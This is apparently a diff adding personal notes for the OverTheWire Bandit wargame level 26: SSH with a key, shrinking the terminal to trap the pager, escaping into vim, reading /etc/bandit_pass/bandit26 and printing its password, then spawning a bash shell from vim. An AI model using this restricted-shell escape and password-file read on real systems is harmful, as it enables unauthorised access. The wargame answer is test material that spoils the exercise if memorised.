@@ -1,0 +1,15 @@
+ssh -i bandit26.sshkey bandit26@localhost
+(gotta make terminal window very small so it won't close the connection right away)
+
+press v to go to vim
+
+:e (to edit) /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+while still in vim:
+:set shell =/bin/bash
+:shell
+
+now we will have a shell in bandit26
+
